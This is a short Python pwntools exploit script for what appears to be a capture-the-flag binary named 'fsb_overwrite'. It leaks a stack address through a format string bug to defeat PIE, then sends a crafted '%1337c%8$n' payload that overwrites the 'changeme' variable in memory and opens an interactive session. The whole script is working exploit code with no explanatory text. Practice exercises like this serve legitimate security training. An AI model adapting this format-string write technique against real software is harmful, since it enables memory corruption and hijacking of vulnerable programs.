from pwn import *

p = process("./fsb_overwrite")
e = ELF("./fsb_overwrite")

context.arch = "amd64"

p.sendline("%9$p")
leak = int(p.recvline()[:-1], 16)
PIE_BASE = leak - e.symbols["_start"]
changeme = PIE_BASE + e.symbols["changeme"]

fsb = b''
fsb += b"%1337c" #6bytes  / 6$
fsb += b'%8$n' #4bytes / 6~7$
fsb += b'\x00' * 6 #6bytes / 7$
fsb += p64(changeme) # 8$

p.send(fsb)


p.interactive()